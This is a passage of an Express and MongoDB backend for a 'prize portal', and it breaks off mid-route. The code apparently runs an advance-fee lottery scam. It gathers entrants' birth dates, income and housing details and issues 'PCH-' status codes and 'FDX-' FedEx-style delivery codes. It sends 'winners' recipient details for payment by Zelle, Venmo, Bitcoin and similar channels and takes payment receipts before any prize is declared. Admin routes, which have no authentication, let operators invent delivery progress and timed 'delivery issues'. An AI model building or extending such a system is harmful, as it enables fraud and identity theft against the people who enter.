require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const validator = require("validator");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 5000;

// ── Security Middleware ────────────────────────────────────────────────────────
app.use(helmet());
app.use(
  cors({
    origin: process.env.CLIENT_ORIGIN || "http://localhost:5173",
    methods: ["GET", "POST", "PATCH", "DELETE"],
    allowedHeaders: ["Content-Type"],
  }),
);
app.use(express.json({ limit: "10kb" }));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 40,
  message: { error: "Too many requests. Please try again later." },
});
app.use("/api/", limiter);

// ── MongoDB Connection ─────────────────────────────────────────────────────────
mongoose
  .connect(process.env.MONGO_URI || "mongodb://localhost:27017/prize_portal")
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => {
    console.error("❌ MongoDB connection error:", err.message);
    process.exit(1);
  });

// ── Mongoose Schemas & Models ──────────────────────────────────────────────────

const winnerClaimSchema = new mongoose.Schema({
  fullName: { type: String, required: true, trim: true, maxlength: 120 },
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true,
    maxlength: 254,
  },
  phone: { type: String, required: true, trim: true, maxlength: 30 },
  address: { type: String, required: true, trim: true, maxlength: 300 },
  city: { type: String, required: true, trim: true, maxlength: 100 },
  state: { type: String, required: true, trim: true, maxlength: 100 },
  country: { type: String, required: true, trim: true, maxlength: 100 },
  postalCode: { type: String, required: true, trim: true, maxlength: 20 },
  prizeReference: { type: String, required: true, trim: true, maxlength: 100 },
  selectedPrizePackage: {
    type: String,
    trim: true,
    maxlength: 120,
    default: "",
  },
  monthlyIncomeRange: { type: String, trim: true, maxlength: 50, default: "" },
  prizeDeliveryMethod: {
    type: String,
    required: true,
    trim: true,
    enum: ["Cash", "Cheque"],
  },
  preferredDeliveryTime: {
    type: String,
    required: true,
    trim: true,
    maxlength: 100,
  },
  wantsAnonymous: { type: Boolean, default: false },
  rewardEntryId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: "RewardEntry",
    default: null,
  },
  claimToken: { type: String, required: true },
  submittedAt: { type: Date, default: Date.now },
  status: { type: String, default: "Pending Review" },
});
winnerClaimSchema.index({ claimToken: 1 }, { unique: true });
const WinnerClaim = mongoose.model("WinnerClaim", winnerClaimSchema);

// ── Bank transfer option sub-schema ───────────────────────────────────────────
const bankTransferOptionSchema = new mongoose.Schema(
  {
    label: {
      type: String,
      trim: true,
      maxlength: 80,
      default: "Bank Transfer",
    },
    recipientName: { type: String, trim: true, maxlength: 200, default: "" },
    recipientValue: { type: String, trim: true, maxlength: 300, default: "" },
    instructions: { type: String, trim: true, maxlength: 1000, default: "" },
  },
  { _id: false },
);

const paymentReceiptSchema = new mongoose.Schema(
  {
    paymentMethod: { type: String, trim: true, maxlength: 80, default: "" },
    url: { type: String, trim: true, maxlength: 1000, default: "" },
    publicId: { type: String, trim: true, maxlength: 300, default: "" },
    originalFilename: { type: String, trim: true, maxlength: 200, default: "" },
    resourceType: { type: String, trim: true, maxlength: 40, default: "" },
    format: { type: String, trim: true, maxlength: 30, default: "" },
    bytes: { type: Number, default: 0 },
    uploadedAt: { type: Date, default: Date.now },
  },
  { _id: false },
);

// ── Delivery Issue sub-schema ──────────────────────────────────────────────────
const deliveryIssueSchema = new mongoose.Schema(
  {
    message: { type: String, required: true, trim: true, maxlength: 500 },
    createdAt: { type: Date, default: Date.now },
    // null = permanent until removed, otherwise a Date when it auto-clears
    expiresAt: { type: Date, default: null },
    resolved: { type: Boolean, default: false },
  },
  { _id: true },
);

// ── Delivery Tracking sub-schema ───────────────────────────────────────────────
const deliveryTrackingSchema = new mongoose.Schema(
  {
    // Admin-set addresses
    pickupAddress: { type: String, trim: true, maxlength: 400, default: "" },
    deliveryAddress: { type: String, trim: true, maxlength: 400, default: "" },
    // Progress: 0–100
    progressPercent: { type: Number, default: 0, min: 0, max: 100 },
    // Current checkpoint label
    currentCheckpoint: {
      type: String,
      trim: true,
      maxlength: 120,
      default: "Processing",
    },
    // Estimated delivery
    estimatedDelivery: { type: String, trim: true, maxlength: 80, default: "" },
    // Carrier / courier
    carrier: { type: String, trim: true, maxlength: 80, default: "FedEx" },
    trackingNumber: { type: String, trim: true, maxlength: 80, default: "" },
    // Issues list
    issues: { type: [deliveryIssueSchema], default: [] },
    // Timestamps
    dispatchedAt: { type: Date, default: null },
    deliveredAt: { type: Date, default: null },
    updatedAt: { type: Date, default: Date.now },
  },
  { _id: false },
);

const rewardEntrySchema = new mongoose.Schema({
  fullName: { type: String, required: true, trim: true, maxlength: 120 },
  homeAddress: { type: String, required: true, trim: true, maxlength: 300 },
  state: { type: String, required: true, trim: true, maxlength: 100 },
  dateOfBirth: { type: String, required: true, trim: true, maxlength: 30 },
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true,
    maxlength: 254,
  },
  phone: { type: String, required: true, trim: true, maxlength: 30 },
  occupation: { type: String, required: true, trim: true, maxlength: 120 },
  sex: { type: String, required: true, trim: true, enum: ["F", "M"] },
  incomeFrequency: {
    type: String,
    required: true,
    trim: true,
    enum: ["Monthly", "Weekly"],
  },
  incomeAmount: { type: String, required: true, trim: true, maxlength: 80 },
  monthlyIncomeRange: { type: String, trim: true, maxlength: 80, default: "" },
  fulfillmentPreference: {
    type: String,
    required: true,
    trim: true,
    enum: ["Cash", "Check"],
  },
  housingStatus: {
    type: String,
    required: true,
    trim: true,
    enum: ["Own Apartment", "Rent Apartment"],
  },
  selectedRewardPackId: {
    type: String,
    required: true,
    trim: true,
    maxlength: 80,
  },
  selectedRewardPack: {
    type: String,
    required: true,
    trim: true,
    maxlength: 120,
  },
  listedPrice: { type: String, trim: true, maxlength: 20, default: "" },
  // Prize amount won (set by admin when declaring winner)
  prizeAmountWon: { type: String, trim: true, maxlength: 40, default: "" },
  status: { type: String, default: "Awaiting Assignment" },
  assignedInstructionTitle: {
    type: String,
    trim: true,
    maxlength: 120,
    default: "",
  },
  assignedInstructionBody: {
    type: String,
    trim: true,
    maxlength: 1200,
    default: "",
  },
  bankTransferOptions: { type: [bankTransferOptionSchema], default: [] },
  bankTransferExpiresAt: { type: Date, default: null },
  selectedPaymentMethod: {
    type: String,
    trim: true,
    maxlength: 80,
    default: "",
  },
  requestedPaymentMethod: {
    type: String,
    trim: true,
    maxlength: 80,
    default: "",
  },
  paymentReceipt: { type: paymentReceiptSchema, default: null },
  paymentReceivedAt: { type: Date, default: null },
  winnerDeclaredAt: { type: Date, default: null },
  statusCode: { type: String, trim: true, maxlength: 40, default: "" },
  deliveryCode: { type: String, trim: true, maxlength: 40, default: "" },
  verificationToken: { type: String, default: "" },
  // Delivery tracking
  delivery: { type: deliveryTrackingSchema, default: () => ({}) },
  submittedAt: { type: Date, default: Date.now },
});
rewardEntrySchema.index({ statusCode: 1 }, { unique: true, sparse: true });
rewardEntrySchema.index({ deliveryCode: 1 }, { sparse: true });
const RewardEntry = mongoose.model("RewardEntry", rewardEntrySchema);

const scamReportSchema = new mongoose.Schema({
  name: { type: String, required: true, trim: true, maxlength: 120 },
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true,
    maxlength: 254,
  },
  phone: { type: String, trim: true, maxlength: 30, default: "" },
  description: { type: String, required: true, trim: true, maxlength: 2000 },
  submittedAt: { type: Date, default: Date.now },
  status: { type: String, default: "New" },
});
const ScamReport = mongoose.model("ScamReport", scamReportSchema);

// ── Token Store ────────────────────────────────────────────────────────────────
const tokenStore = new Map();
tokenStore.set("DEMO-TOKEN-2024", {
  expiresAt: Date.now() + 7 * 24 * 60 * 60 * 1000,
});

// ── Sanitize helper ────────────────────────────────────────────────────────────
function clean(str) {
  if (typeof str !== "string") return "";
  return str.replace(/<[^>]*>/g, "").trim();
}

function makeStatusCode() {
  return `PCH-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;
}

const allowedPaymentMethods = [
  "Chime",
  "Venmo",
  "Zelle",
  "Apple Pay",
  "Bitcoin",
  "Crypto",
  "Ethereum",
  "E-transfer",
];

// ── Routes ─────────────────────────────────────────────────────────────────────

app.get("/api/health", (_req, res) =>
  res.json({ status: "ok", ts: new Date() }),
);

// POST /api/reward-entries — user submits reward request
app.post("/api/reward-entries", async (req, res) => {
  try {
    const {
      fullName,
      homeAddress,
      state,
      dateOfBirth,
      email,
      phone,
      occupation,
      sex,
      incomeFrequency,
      incomeAmount,
      fulfillmentPreference,
      housingStatus,
      selectedRewardPackId,
      selectedRewardPack,
      listedPrice,
    } = req.body;
    const required = {
      fullName,
      homeAddress,
      state,
      dateOfBirth,
      email,
      phone,
      occupation,
      sex,
      incomeFrequency,
      incomeAmount,
      fulfillmentPreference,
      housingStatus,
      selectedRewardPackId,
      selectedRewardPack,
    };

    for (const [key, val] of Object.entries(required)) {
      if (!val || String(val).trim() === "") {
        return res
          .status(400)
          .json({ error: `Missing required field: ${key}` });
      }
    }

    if (!validator.isEmail(email)) {
      return res
        .status(400)
        .json({ error: "Please provide a valid email address." });
    }

    const entry = new RewardEntry({
      fullName: clean(fullName),
      homeAddress: clean(homeAddress),
      state: clean(state),
      dateOfBirth: clean(dateOfBirth),
      email: validator.normalizeEmail(email) || clean(email),
      phone: clean(phone),
      occupation: clean(occupation),
      sex: clean(sex),
      incomeFrequency: clean(incomeFrequency),
      incomeAmount: clean(incomeAmount),
      monthlyIncomeRange: `${clean(incomeFrequency)}: ${clean(incomeAmount)}`,
      fulfillmentPreference: clean(fulfillmentPreference),
      housingStatus: clean(housingStatus),
      selectedRewardPackId: clean(selectedRewardPackId),
      selectedRewardPack: clean(selectedRewardPack),
      listedPrice: listedPrice ? clean(listedPrice) : "",
      statusCode: makeStatusCode(),
    });

    await entry.save();
    res
      .status(201)
      .json({
        success: true,
        entryId: entry._id,
        status: entry.status,
        statusCode: entry.statusCode,
      });
  } catch (err) {
    console.error("reward entry save error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// PATCH /api/reward-entries/:id/payment-preference - user selects preferred payment method
app.patch("/api/reward-entries/:id/payment-preference", async (req, res) => {
  try {
    const paymentMethod = clean(String(req.body.paymentMethod || ""));
    if (!allowedPaymentMethods.includes(paymentMethod)) {
      return res
        .status(400)
        .json({ error: "Please choose a valid payment method." });
    }

    const current = await RewardEntry.findById(req.params.id);
    if (!current) return res.status(404).json({ error: "Request not found." });
    if (
      current.paymentReceivedAt ||
      ["Payment Confirmed", "Winner Declared", "Closed"].includes(
        current.status,
      )
    ) {
      return res
        .status(409)
        .json({ error: "Payment preference can no longer be changed." });
    }

    current.requestedPaymentMethod = paymentMethod;
    const entry = await current.save();
    res.json({ entry });
  } catch (err) {
    console.error("payment preference save error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// GET /api/reward-entries/status/:id — user polls for their status & bank details
app.get("/api/reward-entries/status/:id", async (req, res) => {
  try {
    const entry = await RewardEntry.findById(req.params.id)
      .select(
        "fullName homeAddress state dateOfBirth email phone occupation sex incomeFrequency incomeAmount monthlyIncomeRange fulfillmentPreference housingStatus selectedRewardPack listedPrice prizeAmountWon status assignedInstructionTitle assignedInstructionBody bankTransferOptions bankTransferExpiresAt selectedPaymentMethod requestedPaymentMethod paymentReceipt paymentReceivedAt winnerDeclaredAt statusCode deliveryCode verificationToken delivery submittedAt",
      )
      .lean();

    if (!entry)
      return res.status(404).json({ error: "Request status was not found." });

    // Auto-resolve expired issues
    if (entry.delivery && entry.delivery.issues) {
      const now = new Date();
      entry.delivery.issues = entry.delivery.issues.filter(
        (issue) =>
          !issue.resolved &&
          (!issue.expiresAt || new Date(issue.expiresAt) > now),
      );
    }

    res.json({ entry });
  } catch (err) {
    console.error("reward entry status error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// PATCH /api/admin/reward-entries/:id/payment-method - admin assigns payment method before receipt upload
app.patch("/api/admin/reward-entries/:id/payment-method", async (req, res) => {
  try {
    const paymentMethod = clean(String(req.body.paymentMethod || ""));
    if (!allowedPaymentMethods.includes(paymentMethod)) {
      return res
        .status(400)
        .json({ error: "Please choose a valid payment method." });
    }

    const current = await RewardEntry.findById(req.params.id);
    if (!current) return res.status(404).json({ error: "Request not found." });
    if (
      current.paymentReceivedAt ||
      ["Payment Confirmed", "Winner Declared", "Closed"].includes(
        current.status,
      )
    ) {
      return res
        .status(409)
        .json({
          error:
            "Payment method can only be assigned before payment is confirmed.",
        });
    }

    current.selectedPaymentMethod = paymentMethod;
    const entry = await current.save();
    res.json({ entry });
  } catch (err) {
    console.error("payment method save error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// POST /api/reward-entries/:id/payment-receipt - save user-uploaded payment receipt metadata
app.post("/api/reward-entries/:id/payment-receipt", async (req, res) => {
  try {
    const { url, publicId, originalFilename, resourceType, format, bytes } =
      req.body;
    const receiptUrl = clean(String(url || ""));
    if (
      !receiptUrl ||
      !validator.isURL(receiptUrl, {
        protocols: ["https"],
        require_protocol: true,
      })
    ) {
      return res
        .status(400)
        .json({ error: "A valid Cloudinary receipt URL is required." });
    }
    if (!publicId || String(publicId).trim() === "") {
      return res
        .status(400)
        .json({ error: "Cloudinary public ID is required." });
    }

    const current = await RewardEntry.findById(req.params.id);
    if (!current) return res.status(404).json({ error: "Request not found." });
    if (
      current.paymentReceivedAt ||
      ["Payment Confirmed", "Winner Declared", "Closed"].includes(
        current.status,
      )
    ) {
      return res
        .status(409)
        .json({
          error:
            "Receipt upload is only available before payment is confirmed.",
        });
    }
    if (!allowedPaymentMethods.includes(current.selectedPaymentMethod)) {
      return res
        .status(400)
        .json({
          error: "Please select a payment method before uploading a receipt.",
        });
    }

    current.paymentReceipt = {
      paymentMethod: current.selectedPaymentMethod,
      url: receiptUrl,
      publicId: clean(String(publicId)).slice(0, 300),
      originalFilename: originalFilename
        ? clean(String(originalFilename)).slice(0, 200)
        : "",
      resourceType: resourceType
        ? clean(String(resourceType)).slice(0, 40)
        : "",
      format: format ? clean(String(format)).slice(0, 30) : "",
      bytes: Number(bytes) > 0 ? Number(bytes) : 0,
      uploadedAt: new Date(),
    };

    const entry = await current.save();
    res.status(201).json({ entry });
  } catch (err) {
    console.error("payment receipt upload error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// GET /api/reward-entries/lookup/:code - find an entry by status code or delivery code
app.get("/api/reward-entries/lookup/:code", async (req, res) => {
  try {
    const code = clean(req.params.code).toUpperCase();
    if (!code)
      return res
        .status(400)
        .json({ error: "Please enter a status or delivery code." });

    const entry = await RewardEntry.findOne({
      $or: [{ statusCode: code }, { deliveryCode: code }],
    })
      .select(
        "fullName selectedRewardPack status statusCode deliveryCode delivery submittedAt winnerDeclaredAt",
      )
      .lean();

    if (!entry)
      return res
        .status(404)
        .json({ error: "No draw or delivery record was found for that code." });

    const matched = entry.deliveryCode === code ? "delivery" : "status";
    res.json({
      entry: {
        _id: entry._id,
        fullName: entry.fullName,
        selectedRewardPack: entry.selectedRewardPack,
        status: entry.status,
        statusCode: entry.statusCode,
        deliveryCode: entry.deliveryCode,
        delivery: entry.delivery,
      },
      matched,
    });
  } catch (err) {
    console.error("reward entry lookup error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// GET /api/reward-entries/delivery/:code — lookup by delivery code
app.get("/api/reward-entries/delivery/:code", async (req, res) => {
  try {
    const entry = await RewardEntry.findOne({
      deliveryCode: clean(req.params.code).toUpperCase(),
    })
      .select(
        "fullName homeAddress state selectedRewardPack listedPrice prizeAmountWon fulfillmentPreference status statusCode deliveryCode delivery submittedAt winnerDeclaredAt",
      )
      .lean();

    if (!entry)
      return res.status(404).json({ error: "Delivery code not found." });

    // Auto-resolve expired issues
    if (entry.delivery && entry.delivery.issues) {
      const now = new Date();
      entry.delivery.issues = entry.delivery.issues.filter(
        (issue) =>
          !issue.resolved &&
          (!issue.expiresAt || new Date(issue.expiresAt) > now),
      );
    }

    res.json({ entry });
  } catch (err) {
    console.error("delivery code lookup error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// GET /api/admin/reward-entries — admin lists all reward entries
app.get("/api/admin/reward-entries", async (_req, res) => {
  try {
    const entries = await RewardEntry.find()
      .sort({ submittedAt: -1 })
      .select("-__v")
      .lean();

    res.json({ entries });
  } catch (err) {
    console.error("admin reward entries list error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// GET /api/admin/reward-entries/in-delivery — entries currently under delivery
app.get("/api/admin/reward-entries/in-delivery", async (_req, res) => {
  try {
    const entries = await RewardEntry.find({
      status: { $in: ["Winner Declared", "Payment Confirmed"] },
      "delivery.deliveryAddress": { $ne: "" },
    })
      .sort({ winnerDeclaredAt: -1 })
      .select(
        "fullName homeAddress selectedRewardPack prizeAmountWon fulfillmentPreference statusCode deliveryCode delivery status winnerDeclaredAt",
      )
      .lean();

    res.json({ entries });
  } catch (err) {
    console.error("admin in-delivery list error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// PATCH /api/admin/reward-entries/:id/status
app.patch("/api/admin/reward-entries/:id/status", async (req, res) => {
  try {
    const allowedStatuses = [
      "Awaiting Assignment",
      "Reviewed",
      "Transfer Details Sent",
      "Payment Confirmed",
      "Winner Declared",
      "Closed",
    ];
    const status = clean(req.body.status);
    if (!allowedStatuses.includes(status)) {
      return res.status(400).json({ error: "Invalid request status." });
    }
    const entry = await RewardEntry.findByIdAndUpdate(
      req.params.id,
      { status },
      { new: true, runValidators: true },
    ).lean();
    if (!entry) return res.status(404).json({ error: "Request not found." });
    res.json({ entry });
  } catch (err) {
    console.error("admin reward entry update error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// PATCH /api/admin/reward-entries/:id/payment-received
app.patch(
  "/api/admin/reward-entries/:id/payment-received",
  async (req, res) => {
    try {
      const entry = await RewardEntry.findByIdAndUpdate(
        req.params.id,
        { status: "Payment Confirmed", paymentReceivedAt: new Date() },
        { new: true, runValidators: true },
      ).lean();
      if (!entry) return res.status(404).json({ error: "Request not found." });
      res.json({ entry });
    } catch (err) {
      console.error("admin payment received error:", err);
      res.status(500).json({ error: "Server error. Please try again later." });
    }
  },
);

// PATCH /api/admin/reward-entries/:id/declare-winner
app.patch("/api/admin/reward-entries/:id/declare-winner", async (req, res) => {
  try {
    const current = await RewardEntry.findById(req.params.id);
    if (!current) return res.status(404).json({ error: "Request not found." });

    current.status = "Winner Declared";
    current.winnerDeclaredAt = new Date();
    if (!current.statusCode) {
      current.statusCode = makeStatusCode();
    }
    if (!current.deliveryCode) {
      current.deliveryCode = `FDX-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;
    }
    // Set prize amount if provided
    if (req.body.prizeAmountWon) {
      current.prizeAmountWon = clean(String(req.body.prizeAmountWon)).slice(
        0,
        40,
      );
    }

    const entry = await current.save();
    res.json({ entry });
  } catch (err) {
    console.error("admin declare winner error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// PATCH /api/admin/reward-entries/:id/transfer-details
app.patch(
  "/api/admin/reward-entries/:id/transfer-details",
  async (req, res) => {
    try {
      const { bankTransferOptions, bankTransferExpiresAt } = req.body;

      if (
        !Array.isArray(bankTransferOptions) ||
        bankTransferOptions.length === 0
      ) {
        return res
          .status(400)
          .json({ error: "At least one bank transfer method is required." });
      }

      const cleanedOptions = bankTransferOptions.map((opt) => ({
        label: opt.label
          ? clean(String(opt.label)).slice(0, 80)
          : "Bank Transfer",
        recipientName: opt.recipientName
          ? clean(String(opt.recipientName)).slice(0, 200)
          : "",
        recipientValue: opt.recipientValue
          ? clean(String(opt.recipientValue)).slice(0, 300)
          : "",
        instructions: opt.instructions
          ? clean(String(opt.instructions)).slice(0, 1000)
          : "",
      }));

      for (const opt of cleanedOptions) {
        if (!opt.recipientName && !opt.recipientValue) {
          return res
            .status(400)
            .json({
              error:
                "Each transfer method must have at least an account name or account number.",
            });
        }
      }

      const updatePayload = {
        bankTransferOptions: cleanedOptions,
        bankTransferExpiresAt: bankTransferExpiresAt
          ? new Date(bankTransferExpiresAt)
          : null,
        status: "Transfer Details Sent",
      };

      const entry = await RewardEntry.findByIdAndUpdate(
        req.params.id,
        updatePayload,
        { new: true, runValidators: true },
      ).lean();

      if (!entry) return res.status(404).json({ error: "Request not found." });
      res.json({ entry });
    } catch (err) {
      console.error("admin transfer details error:", err);
      res.status(500).json({ error: "Server error. Please try again later." });
    }
  },
);

// PATCH /api/admin/reward-entries/:id/instructions
app.patch("/api/admin/reward-entries/:id/instructions", async (req, res) => {
  try {
    const { assignedInstructionTitle, assignedInstructionBody } = req.body;

    if (
      !assignedInstructionTitle ||
      String(assignedInstructionTitle).trim() === ""
    ) {
      return res.status(400).json({ error: "Instruction title is required." });
    }
    if (
      !assignedInstructionBody ||
      String(assignedInstructionBody).trim() === ""
    ) {
      return res
        .status(400)
        .json({ error: "Instruction details are required." });
    }

    const entry = await RewardEntry.findByIdAndUpdate(
      req.params.id,
      {
        assignedInstructionTitle: clean(assignedInstructionTitle),
        assignedInstructionBody: clean(assignedInstructionBody),
      },
      { new: true, runValidators: true },
    ).lean();

    if (!entry) return res.status(404).json({ error: "Request not found." });
    res.json({ entry });
  } catch (err) {
    console.error("admin reward entry instructions error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// ── DELIVERY TRACKING ROUTES ───────────────────────────────────────────────────

// PATCH /api/admin/reward-entries/:id/delivery — admin sets delivery addresses & progress
app.patch("/api/admin/reward-entries/:id/delivery", async (req, res) => {
  try {
    const {
      pickupAddress,
      deliveryAddress,
      progressPercent,
      currentCheckpoint,
      estimatedDelivery,
      carrier,
      trackingNumber,
    } = req.body;

    const update = { "delivery.updatedAt": new Date() };

    if (pickupAddress !== undefined)
      update["delivery.pickupAddress"] = clean(String(pickupAddress)).slice(
        0,
        400,
      );
    if (deliveryAddress !== undefined)
      update["delivery.deliveryAddress"] = clean(String(deliveryAddress)).slice(
        0,
        400,
      );
    if (progressPercent !== undefined) {
      const p = parseInt(progressPercent, 10);
      if (isNaN(p) || p < 0 || p > 100)
        return res
          .status(400)
          .json({ error: "progressPercent must be 0–100." });
      update["delivery.progressPercent"] = p;
    }
    if (currentCheckpoint !== undefined)
      update["delivery.currentCheckpoint"] = clean(
        String(currentCheckpoint),
      ).slice(0, 120);
    if (estimatedDelivery !== undefined)
      update["delivery.estimatedDelivery"] = clean(
        String(estimatedDelivery),
      ).slice(0, 80);
    if (carrier !== undefined)
      update["delivery.carrier"] = clean(String(carrier)).slice(0, 80);
    if (trackingNumber !== undefined)
      update["delivery.trackingNumber"] = clean(String(trackingNumber)).slice(
        0,
        80,
      );

    const entry = await RewardEntry.findByIdAndUpdate(
      req.params.id,
      { $set: update },
      { new: true, runValidators: true },
    ).lean();

    if (!entry) return res.status(404).json({ error: "Request not found." });
    res.json({ entry });
  } catch (err) {
    console.error("admin delivery update error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// POST /api/admin/reward-entries/:id/delivery/issues — admin adds a delivery issue
app.post("/api/admin/reward-entries/:id/delivery/issues", async (req, res) => {
  try {
    const { message, durationMinutes } = req.body;

    if (!message || String(message).trim() === "") {
      return res.status(400).json({ error: "Issue message is required." });
    }

    let expiresAt = null;
    if (durationMinutes && parseInt(durationMinutes, 10) > 0) {
      expiresAt = new Date(
        Date.now() + parseInt(durationMinutes, 10) * 60 * 1000,
      );
    }

    const issue = {
      _id: new mongoose.Types.ObjectId(),
      message: clean(String(message)).slice(0, 500),
      createdAt: new Date(),
      expiresAt,
      resolved: false,
    };

    const entry = await RewardEntry.findByIdAndUpdate(
      req.params.id,
      {
        $push: { "delivery.issues": issue },
        $set: { "delivery.updatedAt": new Date() },
      },
      { new: true },
    ).lean();

    if (!entry) return res.status(404).json({ error: "Request not found." });
    res.json({ entry, issueId: issue._id });
  } catch (err) {
    console.error("admin delivery issue add error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// DELETE /api/admin/reward-entries/:id/delivery/issues/:issueId — resolve/remove an issue
app.delete(
  "/api/admin/reward-entries/:id/delivery/issues/:issueId",
  async (req, res) => {
    try {
      const entry = await RewardEntry.findByIdAndUpdate(
        req.params.id,
        {
          $pull: {
            "delivery.issues": {
              _id: new mongoose.Types.ObjectId(req.params.issueId),
            },
          },
          $set: { "delivery.updatedAt": new Date() },
        },
        { new: true },
      ).lean();

      if (!entry) return res.status(404).json({ error: "Request not found." });
      res.json({ entry });
    } catch (err) {
      console.error("admin delivery issue remove error:", err);
      res.status(500).json({ error: "Server error. Please try again later." });
    }
  },
);

// ── Claim routes ────────────────────────────────────────────────────────────────

app.get("/api/claims/validate/:token", async (req, res) => {
  try {
    const { token } = req.params;
    let entry = tokenStore.get(token);

    if (!entry) {
      const rewardEntry = await RewardEntry.findOne({
        verificationToken: token,
      }).lean();
      if (rewardEntry) {
        entry = {
          expiresAt: Date.now() + 7 * 24 * 60 * 60 * 1000,
          rewardEntryId: rewardEntry._id,
        };
        tokenStore.set(token, entry);
      }
    }

    if (!entry) {
      return res
        .status(404)
        .json({
          valid: false,
          reason:
            "This secure claim link is not recognised. Do not forward or disclose claim tokens.",
        });
    }
    if (Date.now() > entry.expiresAt) {
      return res
        .status(410)
        .json({
          valid: false,
          reason:
            "This secure claim link has expired. Please contact our support team and do not share the token.",
        });
    }

    const already = await WinnerClaim.findOne({ claimToken: token }).lean();
    if (already) {
      return res
        .status(409)
        .json({
          valid: false,
          reason: "A claim has already been submitted using this link.",
        });
    }

    if (entry.rewardEntryId) {
      const rewardEntry = await RewardEntry.findById(
        entry.rewardEntryId,
      ).lean();
      return res.json({
        valid: true,
        rewardEntryId: entry.rewardEntryId,
        prefill: rewardEntry
          ? {
              fullName: rewardEntry.fullName,
              email: rewardEntry.email,
              phone: rewardEntry.phone,
              monthlyIncomeRange: rewardEntry.monthlyIncomeRange,
              address: rewardEntry.homeAddress,
              state: rewardEntry.state,
              prizeDeliveryMethod:
                rewardEntry.fulfillmentPreference === "Check"
                  ? "Cheque"
                  : rewardEntry.fulfillmentPreference,
              selectedPrizePackage: rewardEntry.selectedRewardPack,
            }
          : null,
      });
    }

    return res.json({ valid: true });
  } catch (err) {
    console.error("validate error:", err);
    res
      .status(500)
      .json({ valid: false, reason: "Server error. Please try again." });
  }
});

app.post("/api/claims", async (req, res) => {
  try {
    const {
      fullName,
      email,
      phone,
      address,
      city,
      state,
      country,
      postalCode,
      prizeReference,
      selectedPrizePackage,
      monthlyIncomeRange,
      prizeDeliveryMethod,
      preferredDeliveryTime,
      wantsAnonymous,
      rewardEntryId,
      claimToken,
    } = req.body;

    const required = {
      fullName,
      email,
      phone,
      address,
      city,
      state,
      country,
      postalCode,
      prizeReference,
      prizeDeliveryMethod,
      preferredDeliveryTime,
      claimToken,
    };
    for (const [key, val] of Object.entries(required)) {
      if (!val || String(val).trim() === "") {
        return res
          .status(400)
          .json({ error: `Missing required field: ${key}` });
      }
    }

    if (!validator.isEmail(email)) {
      return res
        .status(400)
        .json({ error: "Please provide a valid email address." });
    }

    const cleanedPrizeDeliveryMethod = clean(prizeDeliveryMethod);
    if (!["Cash", "Cheque"].includes(cleanedPrizeDeliveryMethod)) {
      return res
        .status(400)
        .json({
          error: "Please choose Cash or Cheque as the prize delivery method.",
        });
    }

    let entry = tokenStore.get(clean(claimToken));
    if (!entry) {
      const rewardEntry = await RewardEntry.findOne({
        verificationToken: clean(claimToken),
      }).lean();
      if (rewardEntry) {
        entry = {
          expiresAt: Date.now() + 7 * 24 * 60 * 60 * 1000,
          rewardEntryId: rewardEntry._id,
        };
        tokenStore.set(clean(claimToken), entry);
      }
    }
    if (!entry)
      return res
        .status(404)
        .json({
          error:
            "Invalid claim token. Do not disclose claim tokens or secure links.",
        });
    if (Date.now() > entry.expiresAt)
      return res
        .status(410)
        .json({
          error: "This secure claim link has expired. Do not share the token.",
        });

    const already = await WinnerClaim.findOne({
      claimToken: clean(claimToken),
    }).lean();
    if (already)
      return res
        .status(409)
        .json({
          error: "A claim has already been submitted using this secure link.",
        });

    const claim = new WinnerClaim({
      fullName: clean(fullName),
      email: validator.normalizeEmail(email) || clean(email),
      phone: clean(phone),
      address: clean(address),
      city: clean(city),
      state: clean(state),
      country: clean(country),
      postalCode: clean(postalCode),
      prizeReference: clean(prizeReference),
      selectedPrizePackage: selectedPrizePackage
        ? clean(selectedPrizePackage)
        : "",
      monthlyIncomeRange: monthlyIncomeRange ? clean(monthlyIncomeRange) : "",
      prizeDeliveryMethod: cleanedPrizeDeliveryMethod,
      preferredDeliveryTime: clean(preferredDeliveryTime),
      wantsAnonymous: wantsAnonymous === true || wantsAnonymous === "true",
      rewardEntryId: rewardEntryId || entry.rewardEntryId || null,
      claimToken: clean(claimToken),
    });

    await claim.save();
    if (rewardEntryId || entry.rewardEntryId) {
      await RewardEntry.findByIdAndUpdate(
        rewardEntryId || entry.rewardEntryId,
        {
          status: "Verification Submitted",
        },
      );
    }
    res
      .status(201)
      .json({
        success: true,
        message: "Your claim has been received successfully.",
      });
  } catch (err) {
    if (err.code === 11000) {
      return res
        .status(409)
        .json({
          error: "A claim has already been submitted using this secure link.",
        });
    }
    console.error("claim save error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

app.get("/api/claims/status/:token", async (req, res) => {
  try {
    const claim = await WinnerClaim.findOne({
      claimToken: clean(req.params.token),
    })
      .select("status selectedPrizePackage prizeDeliveryMethod submittedAt")
      .lean();

    if (!claim)
      return res.status(404).json({ error: "Claim status was not found." });
    res.json({ claim });
  } catch (err) {
    console.error("claim status error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

app.get("/api/admin/claims", async (_req, res) => {
  try {
